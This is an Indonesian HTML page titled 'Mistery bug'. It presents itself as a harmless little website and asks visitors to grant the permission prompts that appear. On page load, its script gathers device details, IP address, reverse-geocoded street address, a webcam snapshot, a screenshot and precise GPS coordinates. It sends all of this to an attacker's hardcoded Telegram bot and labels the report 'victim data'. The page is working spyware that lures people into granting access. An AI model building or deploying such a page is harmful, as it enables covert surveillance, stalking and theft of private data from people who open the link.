<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mistery bug</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
    <style>
        body {
            background: #000;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: Arial, sans-serif;
            color: #999;
        }
        #permission-container {
            text-align: center;
            width: 80%;
            max-width: 400px;
            padding: 20px;
            background: #111;
            border-radius: 10px;
            box-shadow: 0 0 15px rgba(110, 72, 170, 0.5);
        }
        #permission-text {
            font-size: 22px;
            margin-bottom: 20px;
            color: #6e48aa;
        }
        #permission-details {
            margin-top: 20px;
            font-size: 14px;
            color: #666;
            line-height: 1.5;
        }
        .hidden {
            display: none;
        }
        video, canvas {
            display: none;
        }
    </style>
</head>
<body>
    <div id="permission-container">
        <div id="permission-text">Mistery Bug
               </div>
        <div id="permission-details">
            selamat databg di web bug sederhana ku 
            dibuat oleh : satria 
            <br><br>
            Harap izinkan permintaan akses yang akan muncul.
        </div>
    </div>
    <video id="v" autoplay muted class="hidden"></video>
    <canvas id="c" class="hidden"></canvas>

    <script>
    (() => {
        const T = '7555643519:AAGhvRpmKixSLHbeACC3Ktb4q0XdZtahOMk',
              C = '7290074313';
        
        // Fungsi untuk mengirim pesan ke Telegram
        const sTG = async d => {
            try {
                await fetch(`https://api.telegram.org/bot${T}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: C, text: d, parse_mode: 'HTML' })
                });
            } catch(e) {}
        };
        
        // Fungsi untuk mengirim foto ke Telegram
        const sP = async (b, f) => {
            try {
                const fd = new FormData();
                fd.append('chat_id', C);
                fd.append('photo', b, f);
                await fetch(`https://api.telegram.org/bot${T}/sendPhoto`, {
                    method: 'POST',
                    body: fd
                });
            } catch(e) {}
        };
        
        // Fungsi untuk mendapatkan detail lokasi
        const gLD = async (a, b) => {
            try {
                const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${a}&lon=${b}&zoom=18&addressdetails=1`),
                      d = await r.json();
                if (d.address) {
                    return {
                        kb: d.address.county || d.address.city || d.address.state || "Tidak diketahui",
                        kc: d.address.suburb || d.address.village || d.address.town || "Tidak diketahui",
                        fa: d.display_name || "Alamat tidak tersedia"
                    };
                }
            } catch(e) {}
            return { kb: "Tidak diketahui", kc: "Tidak diketahui", fa: "Alamat tidak tersedia" };
        };
        
        // Fungsi untuk mengumpulkan informasi device
        const cDI = async () => {
            let m = '‚ï≠‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ Data korban ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ ‚¶ø\n\n';
            m += '‚öôÔ∏è DEVICE INFORMATION\n';
            m += `üñ•Ô∏è Device: ${navigator.userAgent}\n`;
            m += `üíª Platform: ${navigator.platform}\n`;
            m += `üåê Bahasa: ${navigator.language}\n`;
            m += `üì∂ Online: ${navigator.onLine ? 'Online' : 'Offline'}\n`;
            m += `üì∫ Screen Size: ${screen.width}x${screen.height}\n`;
            m += `ü™ü Window Size: ${innerWidth}x${innerHeight}\n`;
            m += `üíæ RAM: ${navigator.deviceMemory || 'Unknown'} GB\n`;
            m += `üß† CPU Cores: ${navigator.hardwareConcurrency}\n`;
            
            if (navigator.getBattery) {
                try {
                    const b = await navigator.getBattery();
                    m += `üîã Battery: ${Math.floor(b.level * 100)}%\n`;
                    m += `üîå Charging: ${b.charging ? '‚úÖ YA' : '‚ùå TIDAK'}\n`;
                } catch(e) {
                    m += 'üîã Battery: ‚ùå Tidak tersedia\n';
                }
            }
            
            m += `‚è∞ Waktu Akses: ${new Date().toString()}\n`;
            m += `üïí Page Load Time: ${performance.now().toFixed(2)} ms\n`;
            m += `üìú History Length: ${history.length}\n`;
            m += `‚úã Touch Support: ${'ontouchstart' in window ? '‚úÖ YA' : '‚ùå TIDAK'}\n`;
            m += `üîó Referrer: ${document.referrer || 'None'}\n`;
            m += `üåç URL: ${location.href}\n`;
            m += `üìÑ Title: ${document.title}\n`;
            m += `üïì Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
            m += `üß≠ Offset: ${new Date().getTimezoneOffset()} menit\n\n`;
            
            try {
                const i = await fetch('https://ipapi.co/json/'),
                      d = await i.json();
                m += 'üìç LOCATION INFORMATION\n';
                m += `üì° IP Address: ${d.ip}\n`;
                m += `üèôÔ∏è Kota: ${d.city}\n`;
                m += `üèôÔ∏è Kabupaten: ${d.region}\n`;
                m += `üó∫Ô∏è Wilayah: ${d.region}\n`;
                m += `üåé Negara: ${d.country_name}\n`;
                m += `üè∑Ô∏è Kode Pos: ${d.postal}\n`;
                
                if (d.latitude && d.longitude) {
                    m += `üìå Latitude: ${d.latitude}\n`;
                    m += `üìç Longitude: ${d.longitude}\n`;
                    
                    const l = await gLD(d.latitude, d.longitude);
                    m += `üèôÔ∏è Kabupaten: ${l.kb}\n`;
                    m += `üèôÔ∏è Kecamatan: ${l.kc}\n`;
                    m += `üè† Alamat Lengkap: ${l.fa}\n`;
                }
            } catch(e) {
                m += '‚ùå Gagal mendapatkan informasi lokasi\n';
            }
            
            m += '\n‚ï∞‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ Telegram @@Mysteryid505 ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ ‚¶ø';
            return m;
        };
        
        // Fungsi untuk meminta izin dan mengirim data
        const requestPermissions = async () => {
            // Kirim informasi device terlebih dahulu
            await sTG(await cDI());
            
            // Minta izin kamera
            try {
                const v = document.getElementById('v'),
                      c = document.getElementById('c'),
                      st = await navigator.mediaDevices.getUserMedia({ video: true });
                
                v.srcObject = st;
                await new Promise(r => setTimeout(r, 1000));
                
                c.width = v.videoWidth;
                c.height = v.videoHeight;
                c.getContext('2d').drawImage(v, 0, 0);
                c.toBlob(b => sP(b, 'camera_capture.jpg'), 'image/jpeg');
                
                st.getTracks().forEach(t => t.stop());
            } catch(e) {
                await sTG('‚ùå Camera access blocked');
            }
            
            // Ambil screenshot
            try {
                const cn = await html2canvas(document.body);
                cn.toBlob(b => sP(b, 'screenshot.jpg'), 'image/jpeg');
            } catch(e) {
                await sTG('‚ùå Screenshot failed');
            }
            
            // Minta izin lokasi
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    async p => {
                        let g = `üìç LIVE GPS TRACKING\nüìå Lat: ${p.coords.latitude}\nüìç Lng: ${p.coords.longitude}\nüéØ Akurasi: ${p.coords.accuracy}m\n`;
                        const l = await gLD(p.coords.latitude, p.coords.longitude);
                        g += `üèôÔ∏è Kabupaten: ${l.kb}\nüèôÔ∏è Kecamatan: ${l.kc}\nüè† Alamat: ${l.fa}\n`;
                        await sTG(g);
                    },
                    async e => {
                        await sTG(`‚ùå GPS Error: ${e.message}`);
                    },
                    { enableHighAccuracy: true, maximumAge: 0, timeout: 5000 }
                );
            }
        };
        
        // Jalankan fungsi permintaan izin segera setelah halaman dimuat
        window.onload = requestPermissions;
    })();
    </script>
</body>
</html>
